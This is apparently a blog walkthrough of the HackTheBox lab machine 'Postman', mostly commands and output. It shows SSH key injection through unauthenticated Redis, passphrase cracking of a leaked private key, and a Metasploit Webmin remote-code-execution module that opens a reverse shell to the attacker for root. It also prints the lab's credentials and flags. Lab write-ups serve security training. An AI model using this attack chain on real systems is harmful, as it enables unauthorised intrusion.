---
layout: post
title: Hackthebox Postman Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-03-16/postman-badge.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box "Postman".<br>

# Solution
## 1. Initial Enumeration
### TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.160 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 18:54 EET
Nmap scan report for 10.10.10.160
Host is up (0.043s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.81 seconds
{% endhighlight %}

### Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.160 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.160
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/14 18:59:56 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
/server-status (Status: 403)
/upload (Status: 301)
===============================================================
2020/03/14 19:00:16 Finished
===============================================================
{% endhighlight %}

### Redis enumeration:
Reference: <a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a>
{% highlight shell %}
1n4r1@kali:~$ redis-cli -h 10.10.10.160
10.10.10.160:6379> info
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9435c3c2879311f3
redis_mode:standalone
os:Linux 4.15.0-58-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:7.4.0
process_id:616
run_id:521dd2981efd190099f6fdc8744a20a1b3217664
tcp_port:6379
uptime_in_seconds:444
uptime_in_days:0
hz:10
lru_clock:7323466
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

---

10.10.10.160:6379> keys *
(empty list or set)

0.10.10.160:6379> config get *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "cluster-announce-ip"
  8) ""
  9) "unixsocket"

---

{% endhighlight %}


## 2. Summary

1. Port 22: OpenSSH running
2. Port 80: HTTP website running with Apache
3. Port 6379: Redis 4.0.9 running (anonymous access allowed)
4. Port 10000: Webmin httpd running

## 3. Getting User

Since we have access to redis, we can enumerate the file system with the following way.<br>
As you can see, if we set a non-existing directory, it shows "No such file or directory".
{% highlight shell %}
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis"
10.10.10.160:6379> config set dir /var/lib/redis/non-exist-directory
(error) ERR Changing directory: No such file or directory
{% endhighlight %}

This time, we can find a directory for ssh in the home directory of redis user.
{% highlight shell %}
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> 
{% endhighlight %}

Next, try to upload a public key for SSH.<br>
{% highlight shell %}
root@kali:~# (echo -e "\n\n"; cat .ssh/id_rsa.pub; echo -e "\n\n") > pubkey.txt
{% endhighlight %}
{% highlight shell %}
root@kali:~# cat pubkey.txt | redis-cli -h 10.10.10.160 -x set pubkey
OK
{% endhighlight %}

After that, save the key into the "/var/lib/redis/.ssh/authorized_keys".
{% highlight shell %}
root@kali:~# redis-cli -h 10.10.10.160
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379> 
{% endhighlight %}

Now we can SSH into the server as an user redis.<br>
However, we don't have the "user.txt" in the home directory of redis user.
{% highlight shell %}
root@kali:~# ssh redis@10.10.10.160
The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.
ECDSA key fingerprint is SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.160' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
redis@Postman:~$ 
{% endhighlight %}

With some enumeration, we can find an interesting file "id_rsa.bak" in the "/opt" directory.
{% highlight shell %}
redis@Postman:~$ ls /opt/
id_rsa.bak

redis@Postman:~$ cat /opt/id_rsa.bak 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
redis@Postman:~$ 
{% endhighlight %}

Try to download with scp.
{% highlight shell %}
root@kali:~# scp redis@10.10.10.160:/opt/id_rsa.bak /root
id_rsa.bak                                                        100% 1743    38.3KB/s   00:00    
root@kali:~# 
{% endhighlight %}

Kali Linux can brute-force the password of a SSH private key with the John the Ripper.<br>
However, we need to change the SSH private key into the hash which format is crackable by John the Ripper.<br>
By cracking with "rockyou.txt", we can achieve a password "computer2008" for someone.
{% highlight shell %}
root@kali:~# /usr/share/john/ssh2john.py id_rsa.bak > hash.txt

root@kali:~# john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa.bak)
Warning: Only 2 candidates left, minimum 8 needed for performance.
1g 0:00:00:06 DONE (2020-03-15 10:55) 0.1468g/s 2105Kp/s 2105Kc/s 2105KC/sa6_123..*7¡Vamos!
Session completed
{% endhighlight %}

Actually, we have only one user "Matt" who is allowed to log in except redis.<br>
This time, we can't SSH but we can run su command to be the user "Matt".
{% highlight shell %}
redis@Postman:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash

redis@Postman:~$ su Matt
Password: 
Matt@Postman:/var/lib/redis$ 
{% endhighlight %}

The user.txt is in the home directory of user "Matt".
{% highlight shell %}
Matt@Postman:~$ pwd
/home/Matt

Matt@Postman:~$ cat user.txt 
517ad0ec2458ca97af8d93aac08a2f3c
{% endhighlight %}


## 3. Getting Root

We still have one service that we haven't looked through with is "Webmin httpd".
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-03-16/2020-03-16-19-02-20.png)

For the privilege escalation, we can use the credential for Matt again.<br>
By trying the credential for Matt, we can confirm that the credential for Matt is available for the authentication.
{% highlight shell %}
Matt:computer2008
{% endhighlight %}
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-03-16/2020-03-16-19-07-01.png)

Also, we can search the vulnerability for the Webmin v1.9.1 with searchsploit.
{% highlight shell %}
root@kali:~# searchsploit webmin
-------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                            |  Path
                                                                          | (/usr/share/exploitdb/)
-------------------------------------------------------------------------- ----------------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal           | exploits/cgi/webapps/23535.txt
Webmin - Brute Force / Command Execution                                  | exploits/multiple/remote/705.pl
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing               | exploits/linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                   | exploits/linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                        | exploits/linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                              | exploits/multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                        | exploits/multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)     | exploits/unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                   | exploits/cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                      | exploits/cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)    | exploits/linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                      | exploits/linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)         | exploits/linux/remote/47230.rb
Webmin 1.x - HTML Email Command Execution                                 | exploits/cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (PHP)        | exploits/multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Perl)       | exploits/multiple/remote/2017.pl
phpMyWebmin 1.0 - 'target' Remote File Inclusion                          | exploits/php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                      | exploits/php/webapps/2451.txt
webmin 0.91 - Directory Traversal                                         | exploits/cgi/remote/21183.txt
-------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
{% endhighlight %}

For the Webmin 1.9.10, we have one vulnerability "<a href="https://www.exploit-db.com/exploits/46984">Webmin 1.910 - 'Package Updates' Remote Command Execution</a>".<br>
By using the previous username and password, we can get a root shell.<br>
Also, with the common python method, we can achieve an interactive full shell.
{% highlight shell %}
msf5 > use exploit/linux/http/webmin_packageup_rce 
msf5 exploit(linux/http/webmin_packageup_rce) > set username Matt
username => Matt
msf5 exploit(linux/http/webmin_packageup_rce) > set password computer2008
password => computer2008
msf5 exploit(linux/http/webmin_packageup_rce) > set rhosts 10.10.10.160
rhosts => 10.10.10.160
msf5 exploit(linux/http/webmin_packageup_rce) > set lhost 10.10.14.9
lhost => 10.10.14.9
msf5 exploit(linux/http/webmin_packageup_rce) > set ssl true
ssl => true
msf5 exploit(linux/http/webmin_packageup_rce) > run

[*] Started reverse TCP handler on 10.10.14.9:4444 
[+] Session cookie: 28319cb492d25d1493cbd8a83f732ca8
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.9:4444 -> 10.10.10.160:49658) at 2020-03-16 18:56:54 +0200
id

uid=0(root) gid=0(root) groups=0(root)
python -c "import pty;pty.spawn('/bin/bash')"
root@Postman:/usr/share/webmin/package-updates/# 
{% endhighlight %}

As always, root.txt is in the directory "/root".
{% highlight shell %}
root@Postman:~# pwd
pwd
/root

root@Postman:~# cat root.txt
cat root.txt
a257741c5bed8be7778c6ed95686ddce
root@Postman:~# 
{% endhighlight %}
